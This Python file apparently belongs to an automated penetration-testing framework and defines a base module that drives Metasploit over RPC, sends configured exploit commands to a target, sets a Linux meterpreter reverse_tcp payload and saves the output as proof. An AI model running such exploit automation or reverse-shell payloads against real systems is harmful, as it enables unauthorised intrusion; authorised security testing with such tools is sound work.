from core.actionModule import actionModule
from core.mymsf import MyMsf
from core.utils import Utils


class MsfActionModule(actionModule):
    seen_targets = dict()

    def __init__(self, config, display, lock):
        actionModule.__init__(self, config, display, lock)

        # connect to msfrpc
        self.msf = MyMsf(host=self.config['msfhost'],
                         port=int(self.config['msfport']),
                         user=self.config['msfuser'],
                         password=self.config['msfpass'])

    def go(self, vector):
        self.vector = vector
        self.display.verbose(f"-> Running : {self.getTitle()}")
        self.display.debug(f"---> {self.getDescription()}")
        if not self.msf.is_authenticated():
            return
        ret = self.process()
        self.msf.cleanup()
        return ret

    def execute_msf(self, target, cmds):
        MyMsf.lock.acquire()
        self.display.verbose(f"{self.shortName} - Connecting to {target}")
        for line in cmds['config']:
            if line == "SLEEP":
                self.msf.sleep(int(self.config['msfexploitdelay']))
            else:
                self.msf.execute(line + "\n")
        if cmds['payload'] in ["none", "win"]:
            pass
        elif cmds['payload'] == "linux":
            self.msf.execute("set PAYLOAD linux/x86/meterpreter/reverse_tcp")
            self.msf.execute("set LPORT 4445")
        self.msf.execute("exploit -j\n")
        self.msf.sleep(int(self.config['msfexploitdelay']))
        outfile = self.config["proofsDir"] + self.shortName + "_" + target + "_" + Utils.getRandStr(10)

        result = self.msf.get_result()
        MyMsf.lock.release()
        Utils.writeFile(result, outfile)
        return result, outfile
